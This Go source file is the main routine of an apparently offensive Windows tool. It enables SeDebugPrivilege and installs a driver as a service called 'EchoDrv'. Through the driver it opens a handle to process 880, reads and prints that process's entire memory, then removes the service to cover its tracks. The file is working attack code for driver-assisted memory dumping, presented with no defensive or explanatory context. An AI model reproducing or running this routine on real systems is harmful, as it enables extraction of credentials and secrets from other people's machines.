package main

import (
	"echodriver/driver"
	"echodriver/services"
	"echodriver/utils"
	"errors"
	"fmt"

	"golang.org/x/sys/windows"
)

func main() {

	if err := utils.EnableSeDebugPrivilege(); err != nil {
		utils.ParseError(err)
		return
	}

	srv, err := services.CreateService("EchoDrv", driver.DRIVER_FULL_PATH)

	if err != nil {
		utils.ParseError(err)
		return
	}

	if !services.IsValidServiceConfig(srv) {
		utils.ParseError(errors.New("invalid service config"))
	}

	hDriver, err := driver.GetDriverHandle()

	if err != nil {
		utils.ParseError(err)
		return
	}

	defer windows.CloseHandle(*hDriver)

	handle, err := driver.GetProcHandle(*hDriver, 880)

	if err != nil {
		utils.ParseError(err)
		return
	}

	content, err := driver.ReadAllMemory(*hDriver, handle)

	if err != nil {
		utils.ParseError(err)
		return
	}

	fmt.Println(content)

	services.RemoveService("EchoDrv")

}
